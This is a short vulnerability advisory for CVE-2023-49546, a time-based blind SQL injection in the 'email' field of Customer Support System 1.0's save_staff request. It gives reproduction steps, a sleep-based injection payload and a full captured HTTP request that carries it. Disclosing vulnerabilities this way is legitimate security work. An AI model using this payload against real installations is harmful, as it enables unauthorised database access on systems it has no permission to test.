# CVE-2023-49546
# Customer Support System 1.0 - SQL Injection Vulnerability in the "email" Parameter During "save_staff" Operation

**Description**: A SQL Injection vulnerability exists in version 1 of the Customer Support System. A malicious attacker can issue SQL commands to the MySQL database when creating/editing a staff user through the vulnerable parameter 'email'.  
  
**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49546     
**Tested on**: Windows  
### Steps to reproduce:  
1- Log in to the application.  
2- Navigate to the page /customer_support/index.php?page=new_staff to add a staff user or to /customer_support/index.php?page=staff_list to edit a staff user.  
3- Create or edit a staff user and insert a malicious payload into "email" parameter.  
**payload**: '+(select*from(select(sleep(2)))a)+'
### Request:

```
POST /customer_support/ajax.php?action=save_staff HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------323911847618056921711360698406
Content-Length: 1327
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/customer_support/index.php?page=new_staff
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; PHPSESSID=mfd30tu0h0s43s7kdjb74fcu0l

-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="id"


-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="firstname"

Teste2
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="middlename"

Teste2
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="lastname"

Teste2
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="contact"

Teste2
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="address"

Teste2
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="department_id"

1
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="email"

Teste2@Teste2.com'+(select*from(select(sleep(5)))a)+'
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="password"

teste
-----------------------------323911847618056921711360698406
Content-Disposition: form-data; name="cpass"

teste
-----------------------------323911847618056921711360698406--
```
Discoverer(s)/Credits:  
Geraldo Alcântara
